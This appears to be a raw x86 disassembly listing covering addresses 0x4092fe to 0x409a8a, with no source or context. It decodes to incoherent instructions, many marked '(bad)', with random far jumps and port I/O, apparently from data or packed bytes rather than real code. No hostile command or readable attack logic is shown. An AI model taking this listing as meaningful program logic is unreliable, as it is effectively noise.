  4092fe:	shl    DWORD PTR ds:0x89240cd4,0x20
  409305:	jb     0x4092a4
  409307:	cli    
  409308:	scas   al,BYTE PTR es:[edi]
  409309:	mov    esi,0xe726ff9e
  40930e:	xchg   esi,eax
  40930f:	jmp    0xdd08:0xc87a723d
  409316:	jmp    0x2d4e83d2
  40931b:	push   cs
  40931c:	daa    
  40931d:	(bad)  
  40931e:	jge    0x409386
  409320:	push   0xcea6aa2d
  409325:	out    dx,al
  409326:	out    dx,al
  409327:	jb     0x40939f
  409329:	xor    eax,DWORD PTR [edi-0x29fba43a]
  40932f:	push   ebx
  409330:	adc    cl,cl
  409332:	mov    edi,DWORD PTR [ecx-0x2583e584]
  409338:	call   FWORD PTR [esi+eiz*8-0x5a]
  40933c:	leave  
  40933d:	call   DWORD PTR [ebx+0x790c1ce0]
  409343:	aam    0x45
  409345:	add    BYTE PTR [esi+0x6a],al
  409348:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409349:	or     esp,edx
  40934b:	jge    0x40938a
  40934d:	rcl    DWORD PTR [ebp+eiz*8-0x3d],1
  409351:	or     ch,BYTE PTR [ecx-0x2569d004]
  409357:	(bad)  
  409358:	dec    eax
  409359:	repz repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40935c:	stos   DWORD PTR es:[edi],eax
  40935d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40935e:	mov    al,0xc2
  409360:	or     cl,ch
  409362:	adc    BYTE PTR [esi],bl
  409364:	mov    ch,0xb4
  409366:	sbb    al,dh
  409368:	popa   
  409369:	(bad)  
  40936b:	xchg   edi,eax
  40936c:	pop    es
  40936d:	das    
  40936e:	nop
  40936f:	mov    al,bh
  409371:	pop    es
  409372:	(bad)
  409376:	inc    ebx
  409377:	sbb    esi,edi
  409379:	mov    al,0xad
  40937b:	js     0x409344
  40937d:	jl     0x409358
  40937f:	mov    WORD PTR [ebp+0x29],ss
  409382:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409383:	sbb    al,0xca
  409385:	jecxz  0x4093ce
  409387:	push   cs
  409388:	push   esi
  409389:	jp     0x40930d
  40938b:	arpl   WORD PTR [ebp-0x51],cx
  40938e:	aam    0x7c
  409390:	add    esi,DWORD PTR [edi-0x13d9bc4f]
  409396:	shl    BYTE PTR [ecx+0x57da35d],cl
  40939c:	ins    DWORD PTR es:[edi],dx
  40939d:	xchg   ebp,eax
  40939e:	pop    esp
  40939f:	jo     0x4093c5
  4093a1:	in     al,dx
  4093a2:	push   esi
  4093a3:	leave  
  4093a4:	out    dx,al
  4093a5:	jnp    0x4093cf
  4093a7:	(bad)  
  4093a8:	pop    ebx
  4093a9:	je     0x4093bb
  4093ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ac:	inc    esp
  4093ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093ae:	add    al,0x3
  4093b0:	cmc    
  4093b1:	out    0x58,al
  4093b3:	mov    gs,esi
  4093b5:	mov    eax,0x61f5590f
  4093ba:	(bad)  
  4093bb:	xlat   BYTE PTR ds:[ebx]
  4093bc:	es stc 
  4093be:	fidiv  DWORD PTR [ebx+0x56]
  4093c1:	pop    ds
  4093c2:	pop    es
  4093c3:	inc    edx
  4093c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093c5:	cli    
  4093c6:	pop    eax
  4093c7:	xor    dl,BYTE PTR [edi]
  4093c9:	hlt    
  4093ca:	sub    DWORD PTR ds:0x74e3feec,ecx
  4093d0:	inc    eax
  4093d1:	push   edx
  4093d2:	mov    al,0xd9
  4093d4:	inc    esp
  4093d5:	push   ebx
  4093d6:	cwde   
  4093d7:	lock inc ecx
  4093d9:	xor    esi,edx
  4093db:	mov    bl,0x65
  4093dd:	lock dec ebx
  4093df:	mov    ds,WORD PTR [ebx+0x23]
  4093e2:	pop    ebx
  4093e3:	(bad)  
  4093e4:	retf   
  4093e5:	pop    ss
  4093e6:	fdivr  QWORD PTR [esi+edx*4+0x1b]
  4093ea:	add    esp,DWORD PTR [esi]
  4093ec:	cmp    edx,DWORD PTR [eax+eiz*4+0x5b]
  4093f0:	pop    edi
  4093f1:	sub    cl,BYTE PTR [ebx+eiz*8-0x42]
  4093f5:	jns    0x40942c
  4093f7:	js     0x4093f6
  4093f9:	cmp    BYTE PTR [eax+0x3b6069e],0x1e
  409400:	ins    BYTE PTR es:[edi],dx
  409401:	call   0x352930a3
  409406:	gs jge 0x40939f
  409409:	shl    dh,0x9a
  40940c:	pop    edi
  40940d:	and    eax,DWORD PTR [ecx+0x216a0b03]
  409413:	das    
  409414:	aaa    
  409415:	mov    WORD PTR [edx+0x2a],ds
  409418:	clc    
  409419:	add    DWORD PTR [eax-0x7cd7e1c],ebp
  40941f:	adc    esi,DWORD PTR [esi+0x5a]
  409422:	mov    eax,ds:0x54a4242d
  409427:	jp     0x409441
  409429:	dec    edi
  40942a:	push   0x52
  40942c:	add    eax,0x19310692
  409431:	jae    0x4094a1
  409433:	jge    0x40942d
  409435:	int3   
  409436:	inc    edx
  409437:	nop
  409438:	add    ebx,DWORD PTR [edi-0x52c17612]
  40943e:	mov    al,0x5f
  409440:	mov    dl,0x12
  409442:	dec    ecx
  409443:	data16 or BYTE PTR [eax],0x77
  409447:	pusha  
  409448:	xlat   BYTE PTR ds:[ebx]
  409449:	cmp    al,0xd2
  40944b:	data16 test BYTE PTR [esi+0x6f50edec],dh
  409452:	jle    0x4093d6
  409454:	cmc    
  409455:	push   esi
  409456:	add    al,0x57
  409458:	xlat   BYTE PTR ds:[ebx]
  409459:	(bad)  
  40945a:	ror    DWORD PTR [ecx],cl
  40945c:	repz in al,dx
  40945e:	fld    DWORD PTR [edx-0x3b]
  409461:	jnp    0x4094c2
  409463:	push   es
  409464:	leave  
  409465:	push   edi
  409466:	jmp    0xf589b77a
  40946b:	leave  
  40946c:	fstp   DWORD PTR [ebp+0x34]
  40946f:	(bad)  
  409471:	inc    eax
  409472:	fild   QWORD PTR [esi-0x24f3b775]
  409478:	pop    es
  409479:	das    
  40947a:	inc    ecx
  40947b:	pop    ss
  40947c:	je     0x409477
  40947e:	mov    esp,0x1509977e
  409483:	les    edi,FWORD PTR [edi+0x26384a56]
  409489:	pop    esp
  40948a:	xor    dl,BYTE PTR [edi+0x11]
  40948d:	pop    esp
  40948e:	xor    BYTE PTR ds:0xe3527d4f,dl
  409494:	or     BYTE PTR [eax+0x29],dl
  409497:	or     al,0x75
  409499:	repnz lods eax,DWORD PTR ds:[esi]
  40949b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40949c:	aaa    
  40949d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40949e:	add    BYTE PTR [edx-0x27af503f],al
  4094a4:	add    eax,0xb11c2b6a
  4094a9:	out    0xd1,eax
  4094ab:	dec    ebx
  4094ac:	adc    ebx,DWORD PTR [ebp+0x36]
  4094af:	popf   
  4094b0:	jp     0x40951e
  4094b2:	arpl   WORD PTR [edi+0x7a],di
  4094b5:	xchg   DWORD PTR [esi],eax
  4094b7:	jnp    0x409467
  4094b9:	out    0x99,al
  4094bb:	ins    BYTE PTR es:[edi],dx
  4094bc:	inc    dh
  4094be:	and    al,0xf6
  4094c0:	in     al,0x17
  4094c2:	(bad)  
  4094c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094c4:	xchg   DWORD PTR [esi+0x6a],edx
  4094c7:	inc    edi
  4094c8:	dec    edx
  4094c9:	std    
  4094ca:	sahf   
  4094cb:	inc    edi
  4094cc:	or     ecx,edi
  4094ce:	icebp  
  4094cf:	add    al,0xae
  4094d1:	(bad)  
  4094d2:	call   FWORD PTR [esi]
  4094d4:	xor    bl,dl
  4094d6:	mov    ds:0xb2588fa2,al
  4094db:	or     esi,DWORD PTR [eax]
  4094dd:	das    
  4094de:	push   ss
  4094df:	inc    esi
  4094e0:	lods   al,BYTE PTR ds:[esi]
  4094e1:	gs mov esi,ebx
  4094e4:	cli    
  4094e5:	js     0x4094ca
  4094e7:	cmp    al,0xee
  4094e9:	mov    al,ds:0x7faea712
  4094ee:	(bad)  
  4094ef:	mov    eax,ds:0xdfdae29c
  4094f4:	outs   dx,BYTE PTR ds:[esi]
  4094f5:	sbb    bl,BYTE PTR [edx+edi*2+0x766ec924]
  4094fc:	into   
  4094fd:	push   cs
  4094fe:	stos   BYTE PTR es:[edi],al
  4094ff:	and    eax,DWORD PTR [esi+edi*4+0x2b28acf3]
  409506:	inc    DWORD PTR [eax]
  409508:	mov    al,ds:0xb8383054
  40950d:	xchg   esi,eax
  40950e:	cdq    
  40950f:	out    dx,eax
  409510:	cdq    
  409511:	xor    ch,BYTE PTR [ecx]
  409513:	xchg   edx,eax
  409514:	xchg   ebx,eax
  409515:	jmp    0xa05c:0x73f875a
  40951c:	sbb    ah,al
  40951e:	fbstp  TBYTE PTR [ecx+0x64]
  409521:	sbb    al,0x74
  409523:	adc    BYTE PTR [eax+0x4e],cl
  409526:	int    0x69
  409528:	rep lods al,BYTE PTR ds:[esi]
  40952a:	mov    ch,0x47
  40952c:	mov    eax,0xd9e91911
  409531:	push   eax
  409532:	push   esp
  409533:	jnp    0x409508
  409535:	(bad)  
  409536:	(bad)  
  409538:	mov    dh,0x5e
  40953a:	out    dx,al
  40953b:	fs jae 0x409571
  40953e:	das    
  40953f:	mul    DWORD PTR ds:0xea345826
  409545:	test   al,0xc3
  409547:	repnz push esi
  409549:	cmc    
  40954a:	stos   DWORD PTR es:[edi],eax
  40954b:	push   ss
  40954c:	xchg   esi,eax
  40954d:	mov    al,0x99
  40954f:	or     al,0x83
  409551:	cwde   
  409552:	adc    BYTE PTR [ecx-0x5e],0xd4
  409556:	mov    ds:0xf8d9f712,eax
  40955b:	ja     0x409527
  40955d:	mov    dl,dh
  40955f:	push   DWORD PTR [edx+edx*1-0x74]
  409563:	adc    bl,BYTE PTR fs:[eax-0x5ae1a121]
  40956a:	enter  0x6c07,0x8d
  40956e:	add    DWORD PTR [edx-0x5b19bd8c],ebx
  409574:	push   esi
  409575:	dec    eax
  409576:	ins    DWORD PTR es:[edi],dx
  409577:	nop
  409578:	ja     0x409507
  40957a:	add    dl,BYTE PTR [eax+0x2bd1ce2]
  409580:	outs   dx,DWORD PTR ds:[esi]
  409581:	retf   
  409582:	pop    es
  409583:	inc    ebx
  409584:	sbb    ebx,DWORD PTR [ecx+ebx*4+0x59]
  409588:	(bad)  
  409589:	fadd   DWORD PTR [esi-0x47]
  40958c:	stos   BYTE PTR es:[edi],al
  40958d:	and    eax,0xc2311f95
  409592:	lock mov ch,0x54
  409595:	push   es
  409596:	inc    esp
  409597:	dec    BYTE PTR [esi]
  409599:	or     eax,0x24b8bf5f
  40959e:	dec    edi
  40959f:	mov    DWORD PTR [ebp-0x57c7955d],edx
  4095a5:	push   esp
  4095a6:	mov    esi,0x96f0845e
  4095ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ac:	test   BYTE PTR [ecx],al
  4095ae:	mov    ecx,0x71e87cdb
  4095b3:	int3   
  4095b4:	push   edi
  4095b5:	mov    ah,0xdf
  4095b7:	test   DWORD PTR [ecx+0x603bdc2e],ecx
  4095bd:	dec    ecx
  4095be:	sub    esi,ecx
  4095c0:	mov    ebp,0x62656094
  4095c5:	scas   eax,DWORD PTR es:[edi]
  4095c6:	pop    edi
  4095c7:	xchg   DWORD PTR [ebx],esi
  4095c9:	int3   
  4095ca:	push   es
  4095cb:	test   al,0x11
  4095cd:	adc    eax,0x336e9110
  4095d2:	jb     0x40955c
  4095d4:	mov    eax,0x6c54f915
  4095d9:	sub    al,0xb1
  4095db:	pushf  
  4095dc:	sbb    BYTE PTR [ebx+0x611fcd57],bh
  4095e2:	inc    ebp
  4095e3:	rcr    DWORD PTR [eax-0x36003477],cl
  4095e9:	(bad)  
  4095ea:	push   esp
  4095eb:	jg     0x4095a1
  4095ed:	mov    dl,0x91
  4095ef:	mov    ?,WORD PTR [ebp-0x1e]
  4095f2:	sti    
  4095f3:	jp     0x409672
  4095f5:	mov    dl,0xa
  4095f7:	into   
  4095f8:	ror    BYTE PTR [edi-0x79],1
  4095fb:	jae    0x40962f
  4095fd:	daa    
  4095fe:	aam    0x23
  409600:	push   0x1f60d9b3
  409605:	inc    eax
  409606:	xchg   ecx,eax
  409607:	sahf   
  409608:	ja     0x409634
  40960a:	mov    ebp,0x22a8548
  40960f:	cmp    DWORD PTR [esp+ecx*4-0xe758a7e],esp
  409616:	std    
  409617:	lock iret 
  409619:	pop    edi
  40961a:	repz jnp 0x40963a
  40961d:	adc    esp,DWORD PTR [ebp+ebp*4+0x53]
  409621:	ss jb  0x409629
  409624:	cmp    eax,0x44fcfe06
  409629:	rol    BYTE PTR [eax+0x15926d4a],1
  40962f:	cli    
  409630:	fcom   QWORD PTR [edx]
  409632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409633:	je     0x4095c4
  409635:	ins    BYTE PTR es:[edi],dx
  409636:	rcl    BYTE PTR [edx-0x4f],0xcd
  40963a:	adc    bl,BYTE PTR [eax+0x7c001b0d]
  409640:	popf   
  409641:	sbb    ebx,DWORD PTR [ebx]
  409643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409644:	xchg   esp,ebx
  409646:	in     eax,dx
  409647:	cmp    eax,0x6be281ab
  40964c:	mov    edx,0xe3d94f65
  409651:	es jl  0x4096ae
  409654:	das    
  409655:	xchg   edx,eax
  409656:	retf   0xff73
  409659:	cmp    BYTE PTR [esi+eax*2-0x26],ah
  40965d:	out    dx,eax
  40965e:	mov    bh,BYTE PTR [esi-0x3b]
  409661:	lahf   
  409662:	xor    dh,BYTE PTR [ebx+0x7bb4b4e2]
  409668:	or     eax,0xcca9d3db
  40966d:	pop    edx
  40966e:	push   ss
  40966f:	ficomp DWORD PTR [ebp-0x2e08a1ae]
  409675:	fbld   TBYTE PTR [eax+ebp*8-0x3dcbdf30]
  40967c:	lea    ecx,[ecx+esi*2+0x753707ca]
  409683:	and    al,BYTE PTR [esi+0x3b63a541]
  409689:	pop    esp
  40968a:	pop    ecx
  40968b:	rcr    DWORD PTR [ecx],cl
  40968d:	push   es
  40968e:	mov    gs,WORD PTR [ebx-0x34]
  409691:	jp     0x409645
  409693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409694:	push   0xffffffab
  409696:	and    al,0x1a
  409698:	(bad)  
  409699:	jmp    DWORD PTR [edi+0x34bca774]
  40969f:	mov    BYTE PTR gs:[edi-0x38],bh
  4096a3:	mov    DWORD PTR [ecx+0x4e],0x26cd5d87
  4096aa:	adc    BYTE PTR [ecx],al
  4096ac:	cwde   
  4096ad:	out    dx,al
  4096ae:	pop    esi
  4096af:	cmp    BYTE PTR [edi-0x7b],0x7
  4096b3:	retf   
  4096b4:	sub    al,0xab
  4096b6:	xor    eax,0x865c141a
  4096bb:	ds push esp
  4096bd:	or     DWORD PTR [ebp+0x39c50faf],esi
  4096c3:	or     BYTE PTR [ecx+0x7f8c81f8],0x6a
  4096ca:	iret   
  4096cb:	je     0x4096af
  4096cd:	stos   DWORD PTR es:[edi],eax
  4096ce:	add    ebx,DWORD PTR [ebx+edi*8+0x635b689b]
  4096d5:	int    0xf8
  4096d7:	je     0x40970e
  4096d9:	pop    edi
  4096da:	mov    ah,0xa2
  4096dc:	pop    ss
  4096dd:	add    DWORD PTR [ebx+0x1a46988a],ecx
  4096e3:	or     dl,BYTE PTR [eax+0x2c]
  4096e6:	xchg   BYTE PTR [bx],ah
  4096e9:	fwait
  4096ea:	out    dx,eax
  4096eb:	dec    ebx
  4096ec:	push   0xbfaf8299
  4096f1:	mov    cl,BYTE PTR [ebx+0x35]
  4096f4:	mov    ds:0xac789f41,al
  4096f9:	xchg   edx,eax
  4096fa:	add    eax,0x24e9db37
  4096ff:	pmullw mm1,QWORD PTR [esi-0x1d]
  409703:	push   0xfffffff3
  409705:	das    
  409706:	mov    bl,0x8c
  409708:	cwde   
  409709:	cli    
  40970a:	div    BYTE PTR ss:[ecx+0xd56297b]
  409711:	jne    0x4096be
  409713:	push   ds
  409714:	cwde   
  409715:	ror    ah,cl
  409717:	adc    al,bh
  409719:	jnp    0x4096a5
  40971b:	jb     0x409745
  40971d:	and    al,0xdf
  40971f:	sub    al,0xe3
  409721:	or     BYTE PTR [esi],dh
  409723:	hlt    
  409724:	mov    ds:0x4d70fb98,eax
  409729:	(bad)  
  40972a:	mov    bh,0x5c
  40972c:	mov    ds:0x62da96fb,eax
  409731:	repz sub BYTE PTR [ecx],0x97
  409735:	fld    TBYTE PTR ds:[ebx+0x55c06b]
  40973c:	in     eax,dx
  40973d:	fdivr  st,st(6)
  40973f:	shr    ecx,0x3c
  409742:	mov    ah,0xe3
  409744:	(bad)  
  409746:	pop    ebx
  409747:	mov    ah,0x20
  409749:	dec    edi
  40974a:	cmp    eax,0xf568f5b1
  40974f:	int    0x95
  409751:	fnsave ds:0xd37c8b7c
  409757:	push   eax
  409758:	mov    eax,ds:0xb0885965
  40975d:	or     eax,0x58161fad
  409762:	out    dx,al
  409763:	add    DWORD PTR [ecx+edi*2-0x1ad13199],eax
  40976a:	in     al,0xd6
  40976c:	in     al,dx
  40976d:	rcr    DWORD PTR [ebp-0x16],0xd7
  409771:	(bad)  
  409772:	fs push esp
  409774:	mov    BYTE PTR [esi+0x14257857],bh
  40977a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40977b:	clc    
  40977c:	sub    al,0x1c
  40977e:	test   BYTE PTR [ebp+0x480cac45],dl
  409784:	add    BYTE PTR [eax],ch
  409786:	add    DWORD PTR [ebx+ebp*2],edx
  409789:	rcl    DWORD PTR [ecx],cl
  40978b:	into   
  40978c:	outs   dx,BYTE PTR ds:[esi]
  40978d:	shl    BYTE PTR [ebp-0x13eeab33],1
  409793:	sbb    BYTE PTR [esi],ch
  409795:	jmp    0x20b67d05
  40979a:	add    ecx,0xedbeb5c3
  4097a0:	cmc    
  4097a1:	or     BYTE PTR [esi],dh
  4097a3:	push   ecx
  4097a4:	cmp    eax,0xe7ee9ba3
  4097a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4097aa:	nop
  4097ab:	dec    edi
  4097ac:	mov    edi,0xb1de6550
  4097b1:	or     edx,eax
  4097b3:	into   
  4097b4:	inc    ebx
  4097b5:	adc    al,0x96
  4097b7:	mov    al,ds:0xe1641171
  4097bc:	inc    eax
  4097bd:	pop    es
  4097be:	out    0x25,eax
  4097c0:	fisubr WORD PTR [ebx]
  4097c2:	shr    ebx,0xc
  4097c5:	mov    ah,0x56
  4097c7:	and    al,0x6d
  4097c9:	(bad)  
  4097ca:	in     eax,dx
  4097cb:	pop    ss
  4097cc:	mov    al,0x98
  4097ce:	push   0x337bb960
  4097d3:	data16 das 
  4097d5:	fninit 
  4097d7:	stos   DWORD PTR es:[edi],eax
  4097d8:	pop    esp
  4097d9:	push   0x6c22fc95
  4097de:	cdq    
  4097df:	mov    ah,0x78
  4097e1:	sbb    dh,BYTE PTR [eax]
  4097e3:	xor    BYTE PTR [esi-0x35],al
  4097e6:	jns    0x409840
  4097e8:	psubd  mm5,QWORD PTR ds:0x3654c2b5
  4097ef:	lock outs dx,DWORD PTR ds:[esi]
  4097f1:	popa   
  4097f2:	push   eax
  4097f3:	push   ss
  4097f4:	mov    ebx,0x93d42d3b
  4097f9:	pop    ebx
  4097fa:	xor    bh,BYTE PTR [ebp-0x72f18d5c]
  409800:	jns    0x409811
  409802:	mov    ecx,0xd0772adf
  409807:	dec    ebp
  409808:	dec    eax
  409809:	pop    ecx
  40980a:	fisttp WORD PTR [ecx+0x2]
  40980d:	adc    edx,ebp
  40980f:	dec    ecx
  409810:	or     ebx,0x2e
  409813:	adc    esp,DWORD PTR [esi-0x168c9fe]
  409819:	fisub  WORD PTR [edi-0x2a]
  40981c:	push   0xffffffe4
  40981e:	out    0xb0,eax
  409820:	mov    ds:0x1d9dfa15,al
  409825:	xor    DWORD PTR [ebx+edx*1+0x35a58dcb],0x68
  40982d:	sbb    DWORD PTR [ebp-0x32],esi
  409830:	push   ebp
  409831:	fistp  QWORD PTR [ecx-0x6e]
  409834:	jae    0x4097f4
  409836:	leave  
  409837:	ret    
  409838:	iret   
  409839:	jle    0x4098b3
  40983b:	std    
  40983c:	ja     0x4097c2
  40983e:	outs   dx,DWORD PTR ds:[esi]
  40983f:	fnstcw WORD PTR [edi+ecx*4]
  409842:	clc    
  409843:	cld    
  409844:	mov    ecx,0x552f9989
  409849:	pop    es
  40984a:	aam    0x8f
  40984c:	into   
  40984d:	outs   dx,DWORD PTR ds:[esi]
  40984e:	clc    
  40984f:	jge    0x409838
  409851:	jno    0x4098bf
  409853:	lods   eax,DWORD PTR ds:[esi]
  409854:	(bad)  
  409855:	out    0xea,eax
  409857:	mov    al,ds:0x56f75c77
  40985c:	add    eax,0xe03fcf57
  409861:	idiv   BYTE PTR [ecx-0x1e]
  409864:	jge    0x409832
  409866:	sub    ebp,DWORD PTR ds:0x122d8e3d
  40986c:	ins    BYTE PTR es:[edi],dx
  40986d:	mov    bh,0xb7
  40986f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409870:	js     0x409849
  409872:	ins    BYTE PTR es:[edi],dx
  409873:	stos   BYTE PTR es:[edi],al
  409874:	inc    edx
  409875:	adc    eax,0xa2b007d5
  40987a:	cs (bad) 
  40987d:	ja     0x409879
  40987f:	scas   eax,DWORD PTR es:[edi]
  409880:	sub    DWORD PTR [esi+0x6293779d],ecx
  409886:	push   0x14
  409888:	ja     0x40982e
  40988a:	inc    esi
  40988b:	pusha  
  40988c:	push   0xffffff94
  40988e:	and    DWORD PTR [esi+0x733fd329],esp
  409894:	xchg   ebx,eax
  409895:	xor    eax,0x5dfa83b6
  40989a:	inc    ebx
  40989b:	jmp    0x3ae5:0xa8f2b639
  4098a2:	mov    ebp,0x8a76f4cd
  4098a7:	stos   BYTE PTR es:[edi],al
  4098a8:	imul   ecx,DWORD PTR [ecx],0x5f
  4098ab:	mov    ds:0xc7e51c82,eax
  4098b0:	jno    0x409929
  4098b2:	outs   dx,BYTE PTR ds:[esi]
  4098b3:	inc    eax
  4098b4:	lods   eax,DWORD PTR ds:[esi]
  4098b5:	or     ecx,esi
  4098b7:	xchg   ecx,eax
  4098b8:	push   ebp
  4098b9:	or     BYTE PTR [ecx],bh
  4098bb:	adc    esp,DWORD PTR [ebx-0x4a]
  4098be:	in     eax,0xa1
  4098c0:	sbb    cl,BYTE PTR [edi+0x389a086a]
  4098c6:	(bad)  
  4098c7:	pop    ebx
  4098c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098c9:	out    0x7,eax
  4098cb:	cwde   
  4098cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4098cd:	pusha  
  4098ce:	cwde   
  4098cf:	fimul  DWORD PTR [edi+0x29b354ea]
  4098d5:	mov    ebx,0x5f4f7c6a
  4098da:	(bad)  
  4098dc:	xlat   BYTE PTR ds:[ebx]
  4098dd:	(bad)  
  4098de:	fnop   
  4098e0:	lea    ebx,[ebx+0x2d]
  4098e3:	push   0xffffffd5
  4098e5:	sbb    al,0x91
  4098e7:	or     DWORD PTR [ecx],0x64
  4098ea:	mov    eax,ds:0x54242521
  4098ef:	sub    DWORD PTR [edi+0x76],esp
  4098f2:	cmc    
  4098f3:	push   eax
  4098f4:	and    al,0xdd
  4098f6:	adc    dh,bl
  4098f8:	popa   
  4098f9:	dec    esp
  4098fa:	jge    0x409948
  4098fc:	dec    ebx
  4098fd:	pop    esi
  4098fe:	mov    ebp,0xd0ba1630
  409903:	adc    al,0xe9
  409905:	aaa    
  409906:	test   al,0xfb
  409908:	jle    0x409986
  40990a:	jbe    0x40994e
  40990c:	xor    DWORD PTR [ebx+0x27cae456],0x4a
  409913:	add    ch,BYTE PTR [edi-0x409f2937]
  409919:	retf   
  40991a:	adc    BYTE PTR [ecx+edx*4],ah
  40991d:	jns    0x4098a5
  40991f:	mov    al,0x9c
  409921:	dec    esi
  409922:	adc    eax,0xe2b8b775
  409927:	ret    
  409928:	and    eax,DWORD PTR [esi+0x5b41aa8e]
  40992e:	call   0x607a:0x771814c0
  409935:	mov    ds:0x5a1f5b7b,eax
  40993a:	xchg   esp,eax
  40993b:	mov    bh,0xbd
  40993d:	or     eax,0x4c7c38eb
  409942:	inc    eax
  409943:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409944:	mov    bl,0x9f
  409947:	in     al,0xc9
  409949:	lea    esi,[esi-0x38]
  40994c:	jb     0x409935
  40994e:	jecxz  0x4099a2
  409950:	iret   
  409951:	push   cs
  409952:	push   edx
  409953:	(bad)  
  409954:	sub    eax,0xb89a539f
  409959:	push   esp
  40995a:	mov    al,ds:0x20f110ba
  40995f:	shr    DWORD PTR [ebp+0x56],0x2
  409963:	ret    0x313b
  409966:	mov    ah,0xbc
  409968:	jmp    0xbc7733e6
  40996d:	mov    esi,0xd0eb4955
  409972:	pushf  
  409973:	test   eax,0x749e7cdf
  409978:	shr    DWORD PTR [eax],cl
  40997a:	xchg   ebx,eax
  40997b:	fst    DWORD PTR [esi+ebx*2]
  40997e:	loope  0x409924
  409980:	adc    ah,BYTE PTR [edi+0x6bb3c9c1]
  409986:	clc    
  409987:	adc    DWORD PTR [edi],esp
  409989:	ret    
  40998a:	not    BYTE PTR [ecx+0x5]
  40998d:	jns    0x4099cf
  40998f:	seto   BYTE PTR [edx+0x2c]
  409993:	inc    eax
  409994:	xchg   DWORD PTR [eax+edx*1-0x3dbd760f],eax
  40999b:	arpl   di,si
  40999d:	fwait
  40999e:	jmp    0x9507f6b2
  4099a3:	xor    BYTE PTR [edi],al
  4099a5:	jmp    0x9576a7a3
  4099aa:	fwait
  4099ab:	rol    ebx,0x1e
  4099ae:	ss loopne 0x409a24
  4099b1:	mov    WORD PTR [ebp-0x61],cs
  4099b4:	std    
  4099b5:	ror    DWORD PTR [ecx+0x59],0x2a
  4099b9:	adc    eax,0xcfd1bda1
  4099be:	jl     0x4099a9
  4099c0:	clc    
  4099c1:	test   al,0xbc
  4099c3:	xor    DWORD PTR [edi],esp
  4099c5:	(bad)  
  4099c7:	sub    dl,BYTE PTR [esi-0x1a]
  4099ca:	in     eax,dx
  4099cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099cc:	in     eax,0x26
  4099ce:	and    edi,ebx
  4099d0:	push   ebp
  4099d1:	leave  
  4099d2:	push   ebx
  4099d3:	cmp    esp,DWORD PTR [esi+0x22a38c06]
  4099d9:	mov    DWORD PTR [ebx+0x14765b5f],ebx
  4099df:	stos   DWORD PTR es:[edi],eax
  4099e0:	push   ecx
  4099e1:	pop    esp
  4099e2:	adc    al,0x7a
  4099e4:	add    al,0xfd
  4099e6:	push   edi
  4099e7:	or     BYTE PTR [edx],ah
  4099e9:	push   edx
  4099ea:	xor    ebp,DWORD PTR [edi-0x66]
  4099ed:	imul   eax,DWORD PTR [edx+edx*2-0x19],0xfeaddfc7
  4099f5:	mov    BYTE PTR [esi+0x19f79e87],ah
  4099fb:	test   DWORD PTR [ebp-0x3bf7a9f6],edx
  409a01:	xor    al,0xa1
  409a03:	mov    bl,dh
  409a05:	xchg   edx,eax
  409a06:	das    
  409a07:	and    BYTE PTR [si+0x4003],0xe3
  409a0d:	lds    ebx,FWORD PTR [eax-0x4d]
  409a10:	cwde   
  409a11:	cmp    DWORD PTR [esi+0x63],edx
  409a14:	(bad)  
  409a15:	jns    0x40999f
  409a17:	nop
  409a18:	arpl   WORD PTR ss:[ebx-0x1393a2ad],bp
  409a1f:	pop    ss
  409a20:	mov    edi,0xc1518398
  409a25:	(bad)  
  409a26:	xchg   esp,eax
  409a27:	jge    0x4099ff
  409a29:	popf   
  409a2a:	daa    
  409a2b:	cmp    al,0x28
  409a2d:	ds ins BYTE PTR es:[edi],dx
  409a2f:	jg     0x409a6c
  409a31:	inc    ecx
  409a32:	jne    0x409aa9
  409a34:	xchg   ebp,eax
  409a35:	jecxz  0x409a2e
  409a37:	xor    BYTE PTR [ebx-0x333d4049],bh
  409a3d:	sar    BYTE PTR [ebx+esi*4-0x641696a0],cl
  409a44:	xchg   esi,eax
  409a45:	pop    es
  409a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a47:	stc    
  409a48:	push   0x8
  409a4a:	add    BYTE PTR [esi],dh
  409a4c:	jl     0x409ab2
  409a4e:	xor    bl,BYTE PTR [eax-0x65068d31]
  409a54:	int    0xad
  409a56:	jecxz  0x4099e6
  409a58:	arpl   WORD PTR [eax-0x6519414a],bp
  409a5e:	(bad)  
  409a5f:	fcomip st,st(4)
  409a61:	fld    TBYTE PTR cs:[esi]
  409a64:	stos   BYTE PTR es:[edi],al
  409a65:	push   ds
  409a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a67:	mov    ds:0xcf6e4693,al
  409a6c:	push   edx
  409a6d:	not    eax
  409a6f:	jnp    0x409a4d
  409a71:	xor    DWORD PTR [ecx-0x4a],0xffffffba
  409a75:	imul   esp,DWORD PTR [ebx],0xcdd76aa5
  409a7b:	sar    BYTE PTR [ebx],1
  409a7d:	scas   al,BYTE PTR es:[edi]
  409a7e:	push   esi
  409a7f:	mov    WORD PTR [esp+esi*4+0x1],?
  409a83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a85:	dec    esp
  409a86:	inc    eax
  409a87:	rol    DWORD PTR [edi-0x77],1
  409a8a:	xchg   ecx,eax
